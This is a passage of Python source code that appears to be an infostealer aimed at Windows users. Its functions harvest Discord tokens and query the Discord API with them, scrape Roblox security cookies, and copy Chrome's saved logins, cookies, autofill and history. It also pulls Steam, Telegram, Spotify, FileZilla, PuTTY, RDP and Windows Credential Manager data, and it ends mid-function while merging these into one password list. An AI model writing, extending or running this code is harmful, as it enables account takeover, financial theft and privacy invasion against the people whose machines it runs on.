# JavaScript token extraction reference removed to avoid confusion.
DISCORD_TOKEN_JS = """"""

def get_discord_profile_from_token(token):
    """Use a valid Discord token to query the Discord API for account details - avoids cached data"""
    profile = {}
    if not token or not requests:
        return profile

    # Multiple endpoints to avoid cached responses
    endpoints = [
        'https://discord.com/api/v9/users/@me',
        'https://discordapp.com/api/v9/users/@me',
        'https://discord.com/api/v8/users/@me',
        'https://discordapp.com/api/v8/users/@me',
        'https://discord.com/api/v10/users/@me',  # Try v10
    ]

    for attempt in range(3):  # Fewer but more aggressive attempts
        for url in endpoints:
            try:
                headers = {
                    'Authorization': token,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'application/json',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Expires': '0'
                }

                # Add timestamp to avoid caching
                params = {'_': str(int(time.time() * 1000))}

                response = requests.get(url, headers=headers, params=params, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    profile['username'] = f"{data.get('username', '')}#{data.get('discriminator', '')}".strip('#')
                    profile['email'] = data.get('email')
                    profile['phone'] = data.get('phone')
                    profile['id'] = str(data.get('id')) if data.get('id') else None
                    premium_type = data.get('premium_type')
                    profile['premium_type'] = {
                        0: 'None',
                        1: 'Nitro Basic',
                        2: 'Nitro',
                        3: 'Nitro 3 Month'
                    }.get(premium_type, 'None')
                    profile['mfa_enabled'] = data.get('mfa_enabled')
                    profile['verified'] = data.get('verified', False)
                    return profile
                elif response.status_code == 401:
                    # Invalid token, stop trying
                    return {}
                elif response.status_code == 429:
                    # Rate limited, wait longer
                    time.sleep(5)
                    continue
                elif response.status_code >= 500:
                    # Server error, try different endpoint
                    continue
                # For other errors, try next endpoint
            except Exception:
                continue
        time.sleep(2)  # Wait before retry

    return profile

def is_roblox_installed():
    """Check if Roblox is installed"""
    try:
        if PLATFORM == "Windows":
            roblox_paths = [
                os.path.expanduser("~\\AppData\\Local\\Roblox"),
                os.path.expanduser("~\\AppData\\Local\\RobloxPlayerLauncher"),
                "C:\\Program Files (x86)\\Roblox",
                "C:\\Program Files\\Roblox",
            ]
            for path in roblox_paths:
                if os.path.exists(path):
                    return True
    except:
        pass
    return False

def get_roblox_email():
    """Extract Roblox linked email/Gmail account"""
    try:
        if PLATFORM == "Windows":
            roblox_paths = [
                os.path.expanduser("~\\AppData\\Local\\Roblox\\GlobalBasicSettings_13.xml"),
                os.path.expanduser("~\\AppData\\Local\\Roblox\\GlobalSettings.xml"),
                os.path.expanduser("~\\AppData\\Local\\Roblox\\settings.json"),
            ]
            
            for path in roblox_paths:
                if os.path.exists(path):
                    try:
                        with open(path, 'rb') as f:
                            content = f.read()
                            
                            import re
                            # Look for email patterns
                            patterns = [
                                rb'([a-zA-Z0-9._%+-]+@gmail\.com)',
                                rb'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
                                rb'"email":"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+)"',
                            ]
                            
                            for pattern in patterns:
                                matches = re.findall(pattern, content)
                                if matches:
                                    for match in matches:
                                        if isinstance(match, bytes):
                                            email = match.decode('utf-8', errors='ignore').strip()
                                        else:
                                            email = str(match).strip()
                                        if email and '@' in email and len(email) > 5:
                                            return email
                    except:
                        pass
            
            # Try searching Roblox AppData recursively
            roblox_appdata = os.path.expanduser("~\\AppData\\Local\\Roblox")
            if os.path.exists(roblox_appdata):
                for root, dirs, files in os.walk(roblox_appdata):
                    for file in files:
                        if file.endswith(('.json', '.xml', '.txt', '.dat')):
                            try:
                                filepath = os.path.join(root, file)
                                with open(filepath, 'rb') as f:
                                    data = f.read()
                                    import re
                                    emails = re.findall(rb'[a-zA-Z0-9._%+-]+@(?:gmail\.com|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', data)
                                    if emails:
                                        for email in emails:
                                            email_str = email.decode('utf-8', errors='ignore')
                                            if '@' in email_str:
                                                return email_str
                            except:
                                pass
    except:
        pass
    return None

def get_roblox_cookie():
    """Extract Roblox security cookie from local Roblox files."""
    try:
        if PLATFORM != "Windows":
            return None
        base_dirs = [
            os.path.expanduser("~\\AppData\\Local\\Roblox"),
            os.path.expanduser("~\\AppData\\Local\\RobloxPlayerLauncher"),
        ]
        patterns = [
            rb'ROBLOSECURITY=([A-Za-z0-9%_\-]+)',
            rb'"ROBLOSECURITY"\s*:\s*"([A-Za-z0-9%_\-]+)"',
            rb'roblosecurity["\']?\s*[:=]\s*["\']([A-Za-z0-9%_\-]+)["\']',
        ]
        for base_dir in base_dirs:
            if not os.path.isdir(base_dir):
                continue
            for root, _, files in os.walk(base_dir):
                for filename in files:
                    if filename.lower().endswith(('.log', '.json', '.xml', '.txt', '.ldb', '.db')) or 'settings' in filename.lower():
                        filepath = os.path.join(root, filename)
                        try:
                            with open(filepath, 'rb') as f:
                                content = f.read()
                                for pattern in patterns:
                                    matches = re.findall(pattern, content)
                                    if matches:
                                        for match in matches:
                                            if isinstance(match, bytes):
                                                cookie = match.decode('utf-8', errors='ignore').strip()
                                            else:
                                                cookie = str(match).strip()
                                            if cookie and len(cookie) > 20:
                                                return cookie
                        except:
                            pass
    except:
        pass
    return None

def get_hardware_devices():
    """Detect hardware devices like webcam, microphone, speakers, monitors"""
    devices = {
        'cameras': [],
        'microphones': [],
        'speakers': [],
        'monitors': [],
        'printers': [],
        'usb_devices': []
    }
    
    try:
        if PLATFORM == "Windows":
            # Get cameras
            try:
                result = subprocess.run(['wmic', 'path', 'win32_pnpdevice', 'where', 'description like "%camera%"', 'get', 'description,name'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    for line in result.stdout.split('\n')[1:]:
                        if line.strip():
                            devices['cameras'].append(line.strip()[:100])
            except:
                pass
            
            # Get microphones
            try:
                result = subprocess.run(['wmic', 'path', 'win32_sounddevice', 'get', 'name,description'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    for line in result.stdout.split('\n')[1:]:
                        if line.strip():
                            devices['microphones'].append(line.strip()[:100])
            except:
                pass
            
            # Get monitors
            try:
                result = subprocess.run(['wmic', 'path', 'win32_desktopmonitor', 'get', 'name,description'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    for line in result.stdout.split('\n')[1:]:
                        if line.strip():
                            devices['monitors'].append(line.strip()[:100])
            except:
                pass
            
            # Get printers
            try:
                result = subprocess.run(['wmic', 'path', 'win32_printer', 'get', 'name,description'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    for line in result.stdout.split('\n')[1:]:
                        if line.strip():
                            devices['printers'].append(line.strip()[:100])
            except:
                pass
            
            # Get USB devices
            try:
                result = subprocess.run(['wmic', 'path', 'win32_usbcontrollerdevice', 'get', 'name,description'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    for line in result.stdout.split('\n')[1:]:
                        if line.strip():
                            devices['usb_devices'].append(line.strip()[:100])
            except:
                pass
            
            # Also get printers via another method
            try:
                result = subprocess.run(['wmic', 'logicaldisk', 'get', 'Name'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    for line in result.stdout.split('\n')[1:]:
                        if line.strip():
                            devices['usb_devices'].append(f"Drive: {line.strip()}")
            except:
                pass
    except:
        pass
    
    return devices

def is_discord_installed():
    """Check if Discord is installed"""
    try:
        if PLATFORM == "Windows":
            discord_paths = [
                os.path.expanduser("~\\AppData\\Local\\Discord"),
                os.path.expanduser("~\\AppData\\Roaming\\discord"),
                "C:\\Program Files\\Discord",
                "C:\\Program Files (x86)\\Discord",
                os.path.expanduser("~\\AppData\\Local\\DiscordPTB"),
            ]
            for path in discord_paths:
                if os.path.exists(path):
                    return True
    except:
        pass
    return False

def is_discord_running():
    """Check if Discord process is currently running"""
    try:
        if PLATFORM == "Windows":
            result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
            if 'Discord.exe' in result.stdout or 'discord.exe' in result.stdout:
                return True
    except:
        pass
    return False

def is_roblox_running():
    """Check if Roblox process is currently running"""
    try:
        if PLATFORM == "Windows":
            result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
            if 'RobloxPlayerBeta.exe' in result.stdout or 'RobloxPlayer.exe' in result.stdout or 'Roblox.exe' in result.stdout:
                return True
    except:
        pass
    return False

def get_discord_email():
    """Extract Discord email/Gmail from user account data - AGGRESSIVELY"""
    try:
        if PLATFORM == "Windows":
            for discord_path in get_discord_leveldb_paths():
                if not os.path.exists(discord_path):
                    continue
                
                # Search ALL files, not just in order
                for filename in os.listdir(discord_path):
                    filepath = os.path.join(discord_path, filename)
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read()
                            
                            import re
                            # Multiple aggressive patterns
                            patterns = [
                                rb'\"email\":\s*\"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\"',
                                rb'\"email\":\"([^"]+@[^"]+)\"',
                                rb'email[\"\']?:\s*[\"\']?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
                                rb'([a-zA-Z0-9._%+-]+@gmail\.com)',
                                rb'([a-zA-Z0-9._%+-]+@yahoo\.com)',
                                rb'([a-zA-Z0-9._%+-]+@outlook\.com)',
                                rb'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
                            ]
                            
                            for pattern in patterns:
                                matches = re.findall(pattern, content)
                                if matches:
                                    for match in matches:
                                        if isinstance(match, bytes):
                                            email = match.decode('utf-8', errors='ignore').strip()
                                        else:
                                            email = str(match).strip()
                                        if email and '@' in email and len(email) > 5 and '.com' in email.lower():
                                            return email
                    except:
                        pass
    except:
        pass
    return None

def get_discord_user_id():
    """Extract Discord user ID from account data"""
    try:
        if PLATFORM == "Windows":
            for discord_path in get_discord_leveldb_paths():
                if not os.path.exists(discord_path):
                    continue
                
                for filename in sorted(os.listdir(discord_path), reverse=True):
                    if not filename.endswith(('.ldb', '.log')):
                        continue
                    
                    filepath = os.path.join(discord_path, filename)
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read()
                            
                            import re
                            # Look for user ID
                            patterns = [
                                rb'"id":"(\d{15,})"',
                                rb'"id":(\d{15,})',
                            ]
                            
                            for pattern in patterns:
                                matches = re.findall(pattern, content)
                                if matches:
                                    for match in matches:
                                        if isinstance(match, bytes):
                                            user_id = match.decode('utf-8', errors='ignore').strip()
                                        else:
                                            user_id = str(match).strip()
                                        
                                        # Discord IDs are typically 15-20 digits
                                        if user_id.isdigit() and len(user_id) >= 15:
                                            return user_id
                    except:
                        pass
    except:
        pass
    return None

def get_discord_phone(discord_profile=None):
    """Extract Discord phone number if linked - handles all formats and sources"""
    if discord_profile and isinstance(discord_profile, dict):
        # Check direct phone field
        phone = discord_profile.get('phone')
        if phone:
            return phone

        # Check verified phone field
        verified = discord_profile.get('verified', False)
        if verified:
            phone = discord_profile.get('phone')
            if phone:
                return phone

    try:
        if PLATFORM == "Windows":
            # Search in LevelDB paths
            for discord_path in get_discord_leveldb_paths():
                if not os.path.exists(discord_path):
                    continue

                # Search ALL files, not just in order
                for filename in os.listdir(discord_path):
                    filepath = os.path.join(discord_path, filename)
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read()

                            import re
                            # Comprehensive patterns for phone numbers in all formats
                            patterns = [
                                # JSON phone fields (case insensitive)
                                rb'(?i)"phone"\s*:\s*"([+\d\s\-()]{10,})"',
                                rb'(?i)"phone":[\s]*"?([+\d\s\-()]{10,})"?',
                                rb'(?i)phone[\"\']?:\s*[\"\']?([+\d\s\-()]{10,})',
                                # Verified phone fields
                                rb'(?i)"verified"\s*:\s*true\s*,\s*"phone"\s*:\s*"([+\d\s\-()]{10,})"',
                                rb'(?i)"phone_verified"\s*:\s*"([+\d\s\-()]{10,})"',
                                rb'(?i)"mobile"\s*:\s*"([+\d\s\-()]{10,})"',
                                rb'(?i)"mobile":[\s]*"?([+\d\s\-()]{10,})"?',
                                rb'(?i)mobile[\"\']?:\s*[\"\']?([+\d\s\-()]{10,})',
                                rb'(?i)"phoneNumber"\s*:\s*"([+\d\s\-()]{10,})"',
                                rb'(?i)"phoneNumber":[\s]*"?([+\d\s\-()]{10,})"?',
                                rb'(?i)phoneNumber[\"\']?:\s*[\"\']?([+\d\s\-()]{10,})',
                                # E.164 international formats
                                rb'\+\d{1,3}[\s\-\.]?\(?\d{1,4}\)?[\s\-\.]?\d{1,4}[\s\-\.]?\d{1,4}[\s\-\.]?\d{0,4}',
                                # Common US formats
                                rb'\(?\d{3}\)?[\s\-\.]?\d{3}[\s\-\.]?\d{4}',
                                # European formats (including Swedish)
                                rb'\d{2,4}[\s\-\.]?\d{2,4}[\s\-\.]?\d{2,4}[\s\-\.]?\d{2,4}',
                                # Swedish formats (starts with 0)
                                rb'0\d{1,3}[\s\-\.]?\d{2,4}[\s\-\.]?\d{2,4}[\s\-\.]?\d{0,4}',
                                # Generic international with country code
                                rb'\+\d{1,4}[\s\-\(\)]*\d{1,4}[\s\-\(\)]*\d{1,4}[\s\-\(\)]*\d{1,4}[\s\-\(\)]*\d{0,4}',
                                # URL encoded phones
                                rb'%2B\d{1,4}%20?\d{1,4}%20?\d{1,4}%20?\d{1,4}',
                            ]

                            for pattern in patterns:
                                matches = re.findall(pattern, content)
                                if matches:
                                    for match in matches:
                                        if isinstance(match, bytes):
                                            phone = match.decode('utf-8', errors='ignore').strip()
                                        else:
                                            phone = str(match).strip()

                                        # URL decode if needed
                                        if '%' in phone:
                                            import urllib.parse
                                            phone = urllib.parse.unquote(phone)

                                        # Clean up the phone number
                                        phone = re.sub(r'[^\d+\-\(\)\s]', '', phone)

                                        # Validate phone number (must have at least 10 digits, max 15)
                                        digits_only = re.sub(r'[^\d]', '', phone)
                                        if phone and 10 <= len(digits_only) <= 15 and len(phone) >= 10:
                                            # Additional validation: must start with + or digit
                                            if phone.strip().startswith('+') or phone.strip()[0].isdigit():
                                                return phone
                    except:
                        pass

            # Also search in Discord config/cache directories with JSON parsing
            discord_dirs = [
                os.path.expanduser("~\\AppData\\Roaming\\discord"),
                os.path.expanduser("~\\AppData\\Local\\Discord"),
                os.path.expanduser("~\\AppData\\Roaming\\DiscordPTB"),
                os.path.expanduser("~\\AppData\\Local\\DiscordPTB"),
                os.path.expanduser("~\\AppData\\Roaming\\DiscordCanary"),
                os.path.expanduser("~\\AppData\\Local\\DiscordCanary"),
                os.path.expanduser("~\\AppData\\Roaming\\DiscordDevelopment"),
                os.path.expanduser("~\\AppData\\Local\\DiscordDevelopment"),
            ]

            for base_dir in discord_dirs:
                if not os.path.exists(base_dir):
                    continue

                for root, _, files in os.walk(base_dir):
                    for filename in files:
                        if filename.lower().endswith(('.json', '.log', '.txt', '.db', '.ldb')):
                            filepath = os.path.join(root, filename)
                            try:
                                # For JSON files, try to parse as JSON first
                                if filename.lower().endswith('.json'):
                                    try:
                                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                            json_content = f.read()
                                            try:
                                                data = json.loads(json_content)
                                                phone = extract_phone_from_json(data)
                                                if phone:
                                                    return phone
                                            except json.JSONDecodeError:
                                                pass  # Fall back to pattern matching
                                    except:
                                        pass

                                # Pattern matching for all file types
                                with open(filepath, 'rb') as f:
                                    content = f.read()

                                    for pattern in patterns:
                                        matches = re.findall(pattern, content)
                                        if matches:
                                            for match in matches:
                                                if isinstance(match, bytes):
                                                    phone = match.decode('utf-8', errors='ignore').strip()
                                                else:
                                                    phone = str(match).strip()

                                                # URL decode if needed
                                                if '%' in phone:
                                                    import urllib.parse
                                                    phone = urllib.parse.unquote(phone)

                                                # Clean up the phone number
                                                phone = re.sub(r'[^\d+\-\(\)\s]', '', phone)

                                                # Validate phone number
                                                digits_only = re.sub(r'[^\d]', '', phone)
                                                if phone and len(digits_only) >= 10 and len(phone) >= 10:
                                                    return phone
                            except:
                                pass
    except:
        pass
    return None

def extract_phone_from_json(data):
    """Recursively extract phone number from JSON data structure - handles verified phones"""
    if isinstance(data, dict):
        # Check for verified phone combinations
        verified = data.get('verified', False)
        phone = data.get('phone')
        if verified and phone and isinstance(phone, str):
            # Clean and validate
            clean_phone = re.sub(r'[^\d+\-\(\)\s]', '', phone)
            digits_only = re.sub(r'[^\d]', '', clean_phone)
            if clean_phone and 10 <= len(digits_only) <= 15:
                return clean_phone

        for key, value in data.items():
            if key.lower() in ['phone', 'phone_number', 'mobile', 'phonenumber', 'telephone', 'phone_verified']:
                if isinstance(value, str) and value:
                    # Clean and validate
                    clean_phone = re.sub(r'[^\d+\-\(\)\s]', '', value)
                    digits_only = re.sub(r'[^\d]', '', clean_phone)
                    if clean_phone and 10 <= len(digits_only) <= 15:
                        return clean_phone
            elif isinstance(value, (dict, list)):
                result = extract_phone_from_json(value)
                if result:
                    return result
    elif isinstance(data, list):
        for item in data:
            result = extract_phone_from_json(item)
            if result:
                return result
    return None

def get_discord_premium_type():
    """Check if Discord account has Nitro/Premium"""
    try:
        if PLATFORM == "Windows":
            for discord_path in get_discord_leveldb_paths():
                if not os.path.exists(discord_path):
                    continue
                
                for filename in sorted(os.listdir(discord_path), reverse=True):
                    if not filename.endswith(('.ldb', '.log')):
                        continue
                    
                    filepath = os.path.join(discord_path, filename)
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read()
                            
                            import re
                            patterns = [
                                rb'"premium_type":(\d)',
                                rb'premium_type["\s:]+(\d)',
                            ]
                            
                            for pattern in patterns:
                                matches = re.findall(pattern, content)
                                if matches:
                                    for match in matches:
                                        if isinstance(match, bytes):
                                            ptype = int(match.decode('utf-8', errors='ignore'))
                                        else:
                                            ptype = int(match)
                                        
                                        if ptype == 0:
                                            return "None"
                                        elif ptype == 1:
                                            return "Nitro Basic"
                                        elif ptype == 2:
                                            return "Nitro"
                                        elif ptype == 3:
                                            return "Nitro 3 Month"
                    except:
                        pass
    except:
        pass
    return "None"

def get_gmail_from_chrome():
    """Extract Gmail addresses from Chrome's Login Data"""
    try:
        if PLATFORM == "Windows":
            import sqlite3
            import shutil
            
            chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
            if not os.path.exists(chrome_path):
                return None
            
            # Copy file to avoid lock issues
            temp_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'chrome_login.db')
            shutil.copy2(chrome_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value FROM logins")
            
            emails = []
            for row in cursor.fetchall():
                url, username = row
                if username and '@' in username and ('gmail.com' in username.lower() or 'google.com' in url):
                    emails.append(username)
            
            conn.close()
            os.remove(temp_path)
            
            if emails:
                return emails[0]  # Return first Gmail found
    except:
        pass
    return None

def get_steam_credentials():
    """Extract Steam login data"""
    try:
        if PLATFORM == "Windows":
            steam_path = os.path.expanduser("~\\AppData\\Local\\Steam\\config\\loginusers.vdf")
            if os.path.exists(steam_path):
                with open(steam_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    import re
                    # Extract account names and other data
                    accounts = re.findall(r'"([^"]+)"\s*{\s*"AccountName"\s*"([^"]+)"', content)
                    if accounts:
                        return accounts[0][1]  # Return first account name
    except:
        pass
    return None

def get_telegram_sessions():
    """Extract Telegram session data"""
    try:
        if PLATFORM == "Windows":
            telegram_path = os.path.expanduser("~\\AppData\\Roaming\\Telegram Desktop\\tdata")
            if os.path.exists(telegram_path):
                sessions = []
                for file in os.listdir(telegram_path):
                    if file.startswith('session') or file.endswith('.session'):
                        sessions.append(file)
                return sessions if sessions else None
    except:
        pass
    return None

def get_spotify_tokens():
    """Extract Spotify tokens from local storage"""
    try:
        if PLATFORM == "Windows":
            spotify_path = os.path.expanduser("~\\AppData\\Roaming\\Spotify\\Users")
            if os.path.exists(spotify_path):
                for user_dir in os.listdir(spotify_path):
                    user_path = os.path.join(spotify_path, user_dir)
                    if os.path.isdir(user_path):
                        # Look for token files
                        for file in os.listdir(user_path):
                            if 'token' in file.lower():
                                with open(os.path.join(user_path, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    return f.read().strip()
    except:
        pass
    return None

def get_netflix_cookies():
    """Extract Netflix cookies from browser"""
    try:
        if PLATFORM == "Windows":
            import sqlite3
            import shutil
            
            browsers = [
                "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
                "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies"
            ]
            
            for browser_path in browsers:
                cookie_path = os.path.expanduser(browser_path)
                if os.path.exists(cookie_path):
                    temp_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'cookies.db')
                    shutil.copy2(cookie_path, temp_path)
                    
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%netflix.com%'")
                    
                    cookies = {}
                    for row in cursor.fetchall():
                        cookies[row[0]] = row[1]
                    
                    conn.close()
                    os.remove(temp_path)
                    
                    if cookies:
                        return cookies
    except:
        pass
    return None

def get_amazon_credentials():
    """Extract Amazon login data from browser"""
    try:
        if PLATFORM == "Windows":
            import sqlite3
            import shutil
            
            chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
            if os.path.exists(chrome_path):
                temp_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'amazon_login.db')
                shutil.copy2(chrome_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value FROM logins WHERE action_url LIKE '%amazon.com%'")
                
                creds = []
                for row in cursor.fetchall():
                    creds.append(f"{row[0]}: {row[1]}")
                
                conn.close()
                os.remove(temp_path)
                
                return creds if creds else None
    except:
        pass
    return None

def get_paypal_credentials():
    """Extract PayPal login data"""
    try:
        if PLATFORM == "Windows":
            import sqlite3
            import shutil
            
            chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
            if os.path.exists(chrome_path):
                temp_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'paypal_login.db')
                shutil.copy2(chrome_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value FROM logins WHERE action_url LIKE '%paypal.com%'")
                
                creds = []
                for row in cursor.fetchall():
                    creds.append(f"{row[0]}: {row[1]}")
                
                conn.close()
                os.remove(temp_path)
                
                return creds if creds else None
    except:
        pass
    return None

def get_browser_autofill():
    """Extract browser autofill data"""
    try:
        if PLATFORM == "Windows":
            import sqlite3
            import shutil
            
            chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data")
            if os.path.exists(chrome_path):
                temp_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'autofill.db')
                shutil.copy2(chrome_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT name, value FROM autofill")
                
                autofill = {}
                for row in cursor.fetchall():
                    autofill[row[0]] = row[1]
                
                conn.close()
                os.remove(temp_path)
                
                return autofill if autofill else None
    except:
        pass
    return None

def get_browser_history():
    """Extract browser history from Chrome"""
    try:
        if PLATFORM == "Windows":
            import sqlite3
            import shutil
            from datetime import datetime

            chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
            if os.path.exists(chrome_path):
                temp_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'history.db')
                shutil.copy2(chrome_path, temp_path)

                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT urls.url, urls.title, urls.visit_count, urls.last_visit_time,
                           datetime(urls.last_visit_time/1000000-11644473600, 'unixepoch') as last_visit
                    FROM urls
                    ORDER BY urls.last_visit_time DESC
                    LIMIT 100
                """)

                history = []
                for row in cursor.fetchall():
                    url, title, visit_count, last_visit_time, last_visit = row
                    history.append({
                        'url': url,
                        'title': title or 'No title',
                        'visit_count': visit_count,
                        'last_visit': last_visit
                    })

                conn.close()
                os.remove(temp_path)

                return history if history else None
    except:
        pass
    return None

def get_filezilla_credentials():
    """Extract FileZilla FTP credentials"""
    try:
        if PLATFORM == "Windows":
            filezilla_creds = []
            
            # FileZilla config paths
            paths = [
                os.path.expanduser("~\\AppData\\Roaming\\FileZilla\\sitemanager.xml"),
                os.path.expanduser("~\\AppData\\Roaming\\FileZilla\\recentservers.xml"),
            ]
            
            for path in paths:
                if os.path.exists(path):
                    try:
                        import xml.etree.ElementTree as ET
                        tree = ET.parse(path)
                        root = tree.getroot()
                        
                        for server in root.findall(".//Server"):
                            host = server.find("Host")
                            port = server.find("Port")
                            user = server.find("User")
                            pass_elem = server.find("Pass")
                            
                            if host is not None and user is not None:
                                filezilla_creds.append({
                                    'host': host.text or 'Unknown',
                                    'port': port.text if port is not None else '21',
                                    'username': user.text or 'Unknown',
                                    'password': pass_elem.text if pass_elem is not None else 'Unknown',
                                    'type': 'FTP'
                                })
                    except:
                        pass
            
            return filezilla_creds if filezilla_creds else None
    except:
        pass
    return None

def get_putty_credentials():
    """Extract PuTTY SSH session credentials"""
    try:
        if PLATFORM == "Windows":
            putty_creds = []
            
            # PuTTY stores sessions in registry
            import winreg
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\SimonTatham\\PuTTY\\Sessions", 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        session_name = winreg.EnumKey(key, i)
                        session_key = winreg.OpenKey(key, session_name, 0, winreg.KEY_READ)
                        
                        # Get session details
                        try:
                            hostname = winreg.QueryValueEx(session_key, "HostName")[0]
                            username = winreg.QueryValueEx(session_key, "UserName")[0] if "UserName" in [winreg.EnumValue(session_key, j)[0] for j in range(winreg.QueryInfoKey(session_key)[1])] else "Unknown"
                            
                            putty_creds.append({
                                'session': session_name,
                                'hostname': hostname,
                                'username': username,
                                'type': 'SSH'
                            })
                        except:
                            pass
                        
                        winreg.CloseKey(session_key)
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except:
                pass
            
            return putty_creds if putty_creds else None
    except:
        pass
    return None

def get_remote_desktop_credentials():
    """Extract Remote Desktop connection credentials"""
    try:
        if PLATFORM == "Windows":
            rdp_creds = []
            
            # RDP files in Documents
            rdp_dir = os.path.expanduser("~\\Documents")
            if os.path.exists(rdp_dir):
                for file in os.listdir(rdp_dir):
                    if file.endswith('.rdp'):
                        filepath = os.path.join(rdp_dir, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                # Extract basic info from RDP file
                                lines = content.split('\n')
                                hostname = 'Unknown'
                                username = 'Unknown'
                                for line in lines:
                                    if line.startswith('full address:'):
                                        hostname = line.split(':', 1)[1].strip()
                                    elif line.startswith('username:'):
                                        username = line.split(':', 1)[1].strip()
                                
                                if hostname != 'Unknown':
                                    rdp_creds.append({
                                        'file': file,
                                        'hostname': hostname,
                                        'username': username,
                                        'type': 'RDP'
                                    })
                        except:
                            pass
            
            return rdp_creds if rdp_creds else None
    except:
        pass
    return None

def get_windows_credentials():
    """Extract saved Windows credentials from Credential Manager."""
    try:
        if PLATFORM == "Windows":
            creds = []
            result = subprocess.run(['cmdkey', '/list'], capture_output=True, text=True, timeout=10)
            output = result.stdout or result.stderr or ''
            target = None
            username = None
            for line in output.splitlines():
                line = line.strip()
                if line.startswith('Target:'):
                    if target is not None:
                        creds.append({
                            'target': target,
                            'username': username or 'Unknown',
                            'type': 'Windows Credential Manager'
                        })
                    target = line.split(':', 1)[1].strip()
                    username = None
                elif line.startswith('User:') or line.startswith('User Name:'):
                    username = line.split(':', 1)[1].strip()
            if target is not None:
                creds.append({
                    'target': target,
                    'username': username or 'Unknown',
                    'type': 'Windows Credential Manager'
                })
            return creds if creds else None
    except:
        pass
    return None

def get_outlook_credentials():
    """Extract Outlook profile information and config file locations."""
    try:
        if PLATFORM == "Windows":
            outlook_creds = []
            base_path = os.path.expanduser(r"~\AppData\Local\Microsoft\Outlook")
            if os.path.exists(base_path):
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        if file.lower().endswith(('.ost', '.pst', '.xml', '.dat', '.ini')):
                            outlook_creds.append({
                                'file': os.path.join(root, file),
                                'type': 'Outlook Config'
                            })
            return outlook_creds if outlook_creds else None
    except:
        pass
    return None

def get_all_passwords_comprehensive():
    """Comprehensive password extraction from all possible sources"""
    all_passwords = []
    
    # Avoid recursion: do not call get_saved_passwords() here because it aliases this function.
    # Browser passwords are already included through direct extraction helpers if available.
    browser_passwords = None
    if browser_passwords:
        all_passwords.extend(browser_passwords)
    
    # Get Windows credentials
    windows_creds = get_windows_credentials()
    if windows_creds:
        for cred in windows_creds:
            all_passwords.append({
                'browser': 'Windows Credential Manager',
                'url': cred.get('target', 'Unknown'),
                'username': cred.get('username', 'Unknown'),
                'password': 'WINDOWS_ENCRYPTED',
                'type': cred.get('type', 'Unknown')
            })
    
    # Get WiFi passwords
    wifi_passwords = get_wifi_passwords()
    if wifi_passwords:
        for wifi in wifi_passwords:
            all_passwords.append({
                'browser': 'WiFi Network',
                'url': wifi.get('ssid', 'Unknown'),
                'username': 'N/A',
                'password': wifi.get('password', 'Unknown'),
                'type': 'WiFi'
            })
    
    # Get app passwords
    app_passwords = get_app_passwords()
    if app_passwords:
        for app in app_passwords:
            all_passwords.append({
                'browser': app.get('app', 'Unknown App'),
                'url': app.get('url', app.get('session', app.get('token', 'N/A'))),
